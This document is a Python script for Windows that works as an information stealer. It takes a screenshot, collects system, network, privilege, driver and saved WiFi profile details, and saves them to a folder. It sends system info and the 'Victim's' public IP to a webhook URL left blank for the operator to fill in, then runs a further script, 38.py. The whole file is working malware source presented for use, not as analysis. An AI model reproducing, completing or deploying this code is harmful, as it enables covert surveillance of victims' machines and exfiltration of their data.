import os
import shutil
import requests
import socket
import winreg
import pyautogui
import platform
import psutil
from datetime import datetime
from getmac import get_mac_address


infofile1 = "ipconfig.txt"
infofile2 = "sysinfo.txt"

dirsys1 = "Files\ipconfig.txt"
dirsys2 = "Files\sysinfo.txt"

os.system("ipconfig > ipconfig.txt")
shutil.move(infofile1, dirsys1)


def priv():
    f = open("priv.cmd", "w")
    f.write('''echo off

    whoami /priv > Files\systemperms.txt
    exit
    ''')

    os.system("start priv.cmd")

priv()

ss = pyautogui.screenshot()

ss.save("Files\image.jpg")

machine1 = platform.machine()
version1 = platform.version()
platform1 = platform.platform()
uname1 = platform.uname()
system1 = platform.system()
process1 = platform.processor()
computername = socket.gethostname()
localipaddress = socket.gethostbyname(computername)
boottime = datetime.fromtimestamp(psutil.boot_time())

url = "WEBHOOK HERE" # PUT WEBHOOK HERE

def ipaddrr():

	payloads = {
		"content": f"```System Info:\n---------------- \nMachine: {machine1}\nVersion: {version1}\nPlatform: {platform1}\nUname: {uname1}\nSystem: {system1}\nProccessor: {process1}\nPC Name: {computername}\nLocal IP: {localipaddress}\nLast Boot Time: {boottime}```",
		"username": "",
		"avatar_url": "",
	}
	requests.post(url, data=payloads)

ipaddrr()

def ipaddr():
	
	ipaddr = requests.get("https://vpnapi.io/api/").text

	payloads = {
		"content": f"``` Victim: \n{ipaddr}```",
		"username": "",
		"avatar_url": "",
	}
	requests.post(url, data=payloads)

ipaddr()

file1 = "WiFi-List.txt"
fields1 = "Files\WiFi-List.txt"

os.system("netstat -n > Files\ActiveConnections.txt")

os.system("Netsh WLAN show profiles > WiFi-List.txt")

os.remove("priv.cmd")

os.system("DRIVERQUERY > Files\driverquery.txt")

shutil.move(file1, fields1)

sys_file = "ExtraSystemInfo.txt"
sys_dir = "Files\ExtraSystemInfo.txt"

os.system("systeminfo > ExtraSystemInfo.txt")

shutil.move(sys_file, sys_dir)

exec(open("38.py").read())